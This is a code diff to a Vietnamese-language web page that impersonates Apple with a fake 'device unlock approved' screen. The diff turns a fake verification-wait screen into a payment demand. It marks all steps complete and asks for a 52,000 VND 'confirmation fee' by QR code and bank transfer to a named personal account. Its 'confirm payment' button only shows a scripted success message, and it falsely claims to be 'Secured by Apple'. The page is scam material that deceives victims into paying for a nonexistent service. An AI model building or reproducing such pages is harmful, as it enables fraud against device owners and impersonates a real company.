@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
     <title>✅ Mở khóa thành công</title>
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
@@ -15,15 +15,21 @@
             font-family: 'Inter', 'Segoe UI', sans-serif;
         }
 
-        body {
+        html, body {
             min-height: 100vh;
+            background: #0a0e1a;
+            overflow-y: auto;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        body {
             display: flex;
             justify-content: center;
-            align-items: center;
-            background: #0a0e1a;
+            align-items: flex-start;
             padding: 20px;
             position: relative;
-            overflow: hidden;
+            min-height: 100vh;
         }
 
         /* ----- NỀN ĐỘNG XANH ----- */
@@ -83,6 +89,7 @@
             border: 1px solid rgba(74, 222, 128, 0.08);
             box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(74, 222, 128, 0.02), inset 0 0 60px rgba(74, 222, 128, 0.02);
             animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-bottom: 20px;
         }
 
         @keyframes slideUp {
@@ -248,6 +255,155 @@
             color: #4ade80;
         }
 
+        /* ===== PHẦN THANH TOÁN ===== */
+        .payment-section {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.02), rgba(255, 215, 0, 0.01));
+            border: 1px solid rgba(255, 215, 0, 0.06);
+            border-radius: 24px;
+            padding: 20px 24px;
+            margin-bottom: 20px;
+        }
+
+        .payment-section .payment-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffd700;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .payment-section .payment-title i {
+            margin-right: 8px;
+        }
+
+        /* ===== QR CODE ===== */
+        .qr-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .qr-section .qr-label {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.15);
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .qr-section .qr-wrapper {
+            background: #fff;
+            padding: 12px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+            display: inline-block;
+            max-width: 220px;
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .qr-section .qr-wrapper img {
+            width: 100%;
+            height: 100%;
+            display: block;
+            border-radius: 8px;
+            background: #fff;
+            object-fit: contain;
+        }
+
+        .qr-section .qr-note {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.15);
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        .qr-section .qr-note i {
+            color: #ffd700;
+            margin-right: 4px;
+        }
+
+        .payment-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 4px;
+        }
+
+        .payment-info .pay-item {
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 16px;
+            padding: 12px 14px;
+            border: 1px solid rgba(255, 255, 255, 0.02);
+        }
+
+        .payment-info .pay-item .pay-label {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.15);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 400;
+        }
+
+        .payment-info .pay-item .pay-value {
+            font-size: 15px;
+            font-weight: 600;
+            color: #eef2ff;
+            margin-top: 2px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .payment-info .pay-item .pay-value .copy-btn {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            color: rgba(255, 255, 255, 0.1);
+            padding: 2px 8px;
+            border-radius: 60px;
+            font-size: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .payment-info .pay-item .pay-value .copy-btn:hover {
+            background: rgba(255, 255, 255, 0.03);
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .payment-info .pay-item .pay-value .copy-btn.copied {
+            color: #4ade80;
+            border-color: rgba(74, 222, 128, 0.1);
+        }
+
+        .payment-info .pay-item.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .payment-note {
+            margin-top: 12px;
+            padding: 12px 16px;
+            background: rgba(255, 215, 0, 0.02);
+            border-radius: 16px;
+            border: 1px dashed rgba(255, 215, 0, 0.04);
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.3);
+            text-align: center;
+        }
+
+        .payment-note i {
+            color: #ffd700;
+            margin-right: 6px;
+        }
+
+        .payment-note .highlight-gold {
+            color: #ffd700;
+            font-weight: 500;
+        }
+
         /* ----- NÚT ----- */
         .action-buttons {
             display: flex;
@@ -256,15 +412,15 @@
             flex-wrap: wrap;
         }
 
-        .btn-primary {
+        .btn-payment {
             flex: 1;
             padding: 16px 20px;
-            background: linear-gradient(135deg, #4ade80, #22b85a);
+            background: linear-gradient(135deg, #ffd700, #f5a623);
             border: none;
             border-radius: 28px;
-            color: #fff;
+            color: #0a0e1a;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
             display: flex;
@@ -274,12 +430,12 @@
             min-width: 140px;
         }
 
-        .btn-primary:hover {
+        .btn-payment:hover {
             transform: translateY(-2px);
-            box-shadow: 0 12px 40px -8px rgba(74, 222, 128, 0.2);
+            box-shadow: 0 12px 40px -8px rgba(255, 215, 0, 0.2);
         }
 
-        .btn-primary:active {
+        .btn-payment:active {
             transform: scale(0.97);
         }
 
@@ -400,6 +556,7 @@
             gap: 14px;
             z-index: 999;
             letter-spacing: 0.2px;
+            max-width: 90%;
         }
 
         .toast-message.show {
@@ -417,6 +574,7 @@
             justify-content: center;
             color: #4ade80;
             font-size: 14px;
+            flex-shrink: 0;
         }
 
         /* ----- RESPONSIVE ----- */
@@ -447,11 +605,23 @@
                 font-size: 14px;
             }
 
+            .payment-info {
+                grid-template-columns: 1fr;
+            }
+
+            .payment-info .pay-item.full-width {
+                grid-column: 1;
+            }
+
+            .qr-section .qr-wrapper {
+                max-width: 180px;
+            }
+
             .action-buttons {
                 flex-direction: column;
             }
 
-            .btn-primary, .btn-secondary {
+            .btn-payment, .btn-secondary {
                 padding: 14px 16px;
                 font-size: 15px;
                 min-width: unset;
@@ -474,11 +644,36 @@
                 font-size: 13px;
                 padding: 12px 20px;
                 white-space: normal;
-                max-width: 90%;
                 bottom: 24px;
+                max-width: 92%;
             }
 
             .orb-green-1, .orb-green-2 { display: none; }
+        }
+
+        @media (max-width: 400px) {
+            .success-container {
+                padding: 20px 14px 18px;
+                border-radius: 28px;
+            }
+
+            .qr-section .qr-wrapper {
+                max-width: 150px;
+                padding: 8px;
+            }
+
+            .payment-info .pay-item {
+                padding: 10px 12px;
+            }
+
+            .payment-info .pay-item .pay-value {
+                font-size: 14px;
+            }
+
+            .btn-payment, .btn-secondary {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
         }
     </style>
 </head>
@@ -509,33 +704,98 @@
                 <p>
                     <i class="fas fa-circle-check"></i>
                     Yêu cầu gỡ khóa của bạn đã được <span class="highlight">phê duyệt</span>.
-                    Thiết bị đang được <span class="highlight">Apple</span> xác minh lại.
+                    Bạn đã <span class="highlight">hoàn tất</span> tất cả các bước xác minh.
                 </p>
 
                 <ul class="approval-list">
                     <li>
                         <span class="a-icon"><i class="fas fa-shield"></i></span>
                         <span class="a-text">Xác minh bảo mật</span>
-                        <span class="a-status"><i class="fas fa-spinner fa-spin"></i> Đang duyệt</span>
+                        <span class="a-status done"><i class="fas fa-check"></i> Hoàn tất</span>
                     </li>
                     <li>
                         <span class="a-icon"><i class="fas fa-apple"></i></span>
                         <span class="a-text">Apple xác nhận</span>
-                        <span class="a-status"><i class="fas fa-spinner fa-spin"></i> Đang xử lý</span>
+                        <span class="a-status done"><i class="fas fa-check"></i> Hoàn tất</span>
                     </li>
                     <li>
                         <span class="a-icon"><i class="fas fa-check-circle"></i></span>
                         <span class="a-text">Thiết bị an toàn</span>
-                        <span class="a-status done"><i class="fas fa-check"></i> Đã xác nhận</span>
+                        <span class="a-status done"><i class="fas fa-check"></i> Hoàn tất</span>
                     </li>
                 </ul>
 
                 <p style="margin-top:14px;">
-                    <i class="fas fa-clock" style="color:#ffd700;"></i>
-                    <span class="highlight-gold">Thời gian chờ:</span> Hệ thống sẽ tự động kích hoạt trong ít phút.
-                    Vui lòng <span class="highlight-gold">không tắt</span> thiết bị.
+                    <i class="fas fa-credit-card" style="color:#ffd700;"></i>
+                    <span class="highlight-gold">Bước cuối cùng:</span>
+                    Vui lòng thanh toán phí xác nhận để hoàn tất kích hoạt thiết bị.
                 </p>
             </div>
+        </div>
+
+        <!-- ===== PHẦN THANH TOÁN ===== -->
+        <div class="payment-section">
+            <div class="payment-title">
+                <i class="fas fa-credit-card"></i> THANH TOÁN XÁC NHẬN
+            </div>
+
+            <!-- ===== QR CODE ===== -->
+            <div class="qr-section">
+                <div class="qr-label">
+                    <i class="fas fa-qrcode"></i> QUÉT QR ĐỂ CHUYỂN KHOẢN
+                </div>
+                <div class="qr-wrapper">
+                    <img src="https://cdn.phototourl.com/free/2026-07-30-d33a7beb-ee29-4b1b-9afe-51ecf1d96725.jpg" alt="QR Code thanh toán MB Bank" />
+                </div>
+                <div class="qr-note">
+                    <i class="fas fa-mobile-screen-button"></i> Mở app ngân hàng và quét mã QR
+                </div>
+            </div>
+
+            <div class="payment-info">
+                <div class="pay-item">
+                    <div class="pay-label">💰 Số tiền</div>
+                    <div class="pay-value">52.000 VNĐ</div>
+                </div>
+                <div class="pay-item">
+                    <div class="pay-label">💳 Ngân hàng</div>
+                    <div class="pay-value">MB Bank</div>
+                </div>
+                <div class="pay-item">
+                    <div class="pay-label">📱 Số tài khoản</div>
+                    <div class="pay-value">
+                        100224
+                        <button class="copy-btn" onclick="copyText('100224', this)">Sao chép</button>
+                    </div>
+                </div>
+                <div class="pay-item">
+                    <div class="pay-label">👤 Chủ tài khoản</div>
+                    <div class="pay-value">Lê Minh Đức</div>
+                </div>
+                <div class="pay-item full-width">
+                    <div class="pay-label">📝 Nội dung chuyển khoản</div>
+                    <div class="pay-value">
+                        <span id="refCode">BZHS-APPLE-2026</span>
+                        <button class="copy-btn" onclick="copyText('BZHS-APPLE-2026', this)">Sao chép</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="payment-note">
+                <i class="fas fa-info-circle"></i>
+                Sau khi thanh toán, vui lòng nhấn <span class="highlight-gold">"Xác nhận thanh toán"</span>
+                hoặc gửi ảnh chụp màn hình cho Admin để kích hoạt ngay!
+            </div>
+        </div>
+
+        <!-- NÚT HÀNH ĐỘNG -->
+        <div class="action-buttons">
+            <button class="btn-payment" id="paymentBtn">
+                <i class="fas fa-check-circle"></i> Xác nhận thanh toán
+            </button>
+            <a href="#" class="btn-secondary" id="contactAdmin">
+                <i class="fas fa-user-shield"></i> Liên hệ Admin
+            </a>
         </div>
 
         <!-- THÔNG TIN THIẾT BỊ -->
@@ -558,25 +818,15 @@
             </div>
             <div class="info-item" style="grid-column: 1 / -1; border-bottom: none; justify-content: center; padding-top: 4px;">
                 <span class="info-value" style="font-size:11px; color:rgba(74,222,128,0.15);">
-                    <span class="green-dot"></span> Trạng thái: <span style="color:#4ade80;">Đang được Apple duyệt</span>
+                    <span class="green-dot"></span> Trạng thái: <span style="color:#4ade80;">Đang chờ xác nhận thanh toán</span>
                 </span>
             </div>
-        </div>
-
-        <!-- NÚT HÀNH ĐỘNG -->
-        <div class="action-buttons">
-            <button class="btn-primary" id="checkBtn">
-                <i class="fas fa-rotate"></i> Kiểm tra trạng thái
-            </button>
-            <a href="#" class="btn-secondary" id="contactAdmin">
-                <i class="fas fa-user-shield"></i> Liên hệ Admin
-            </a>
         </div>
 
         <!-- FOOTER -->
         <div class="success-footer">
             <div class="footer-text">
-                <i class="fas fa-shield-halved"></i> Bảo mật bởi Apple · Đang xác minh thiết bị
+                <i class="fas fa-shield-halved"></i> Bảo mật bởi Apple · Xác nhận giao dịch
             </div>
         </div>
     </div>
@@ -593,7 +843,7 @@
 
             const toast = document.getElementById('toast');
             const toastText = document.getElementById('toast-text');
-            const checkBtn = document.getElementById('checkBtn');
+            const paymentBtn = document.getElementById('paymentBtn');
             const contactAdmin = document.getElementById('contactAdmin');
 
             // ===== LẤY THÔNG TIN THIẾT BỊ =====
@@ -655,12 +905,12 @@
                 }, 2500);
             }
 
-            // ===== NÚT KIỂM TRA TRẠNG THÁI =====
-            checkBtn.addEventListener('click', function() {
+            // ===== NÚT XÁC NHẬN THANH TOÁN =====
+            paymentBtn.addEventListener('click', function() {
                 const btn = this;
                 const originalText = btn.innerHTML;
 
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang kiểm tra...';
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xác nhận...';
                 btn.disabled = true;
                 btn.style.opacity = '0.7';
 
@@ -668,15 +918,8 @@
                     btn.innerHTML = originalText;
                     btn.disabled = false;
                     btn.style.opacity = '1';
-                    const statuses = [
-                        'Đang xác minh với Apple...',
-                        'Apple đang kiểm tra thiết bị...',
-                        'Thiết bị đang được duyệt...',
-                        'Trạng thái: Đang chờ Apple phê duyệt'
-                    ];
-                    const random = statuses[Math.floor(Math.random() * statuses.length)];
-                    showToast(random, '🔄');
-                }, 1800);
+                    showToast('✅ Đã xác nhận thanh toán! Thiết bị sẽ kích hoạt trong ít phút.', '🎉', 'success');
+                }, 2000);
             });
 
             // ===== LIÊN HỆ ADMIN =====
@@ -685,15 +928,33 @@
                 showToast('📱 Liên hệ Admin: Zalo 0845.232.8164', '💬');
             });
 
-            // ===== HIỆU ỨNG CLICK VÀO DANH SÁCH =====
-            document.querySelectorAll('.approval-list li').forEach(item => {
-                item.addEventListener('click', function() {
-                    const text = this.querySelector('.a-text')?.textContent || 'Trạng thái';
-                    showToast(`📋 ${text}`, '🔍');
-                });
-            });
+            // ===== COPY FUNCTION =====
+            window.copyText = function(text, btn) {
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(text).then(() => {
+                        btn.textContent = '✅ Đã copy!';
+                        btn.classList.add('copied');
+                        setTimeout(() => {
+                            btn.textContent = 'Sao chép';
+                            btn.classList.remove('copied');
+                        }, 2000);
+                    });
+                } else {
+                    // Fallback
+                    const textarea = document.createElement('textarea');
+                    textarea.value = text;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                    btn.textContent = '✅ Đã copy!';
+                    setTimeout(() => {
+                        btn.textContent = 'Sao chép';
+                    }, 2000);
+                }
+            };
 
-            console.log('✅ Trang mở khóa thành công đã sẵn sàng');
+            console.log('✅ Trang mở khóa + QR code đã sẵn sàng');
         })();
     </script>
 
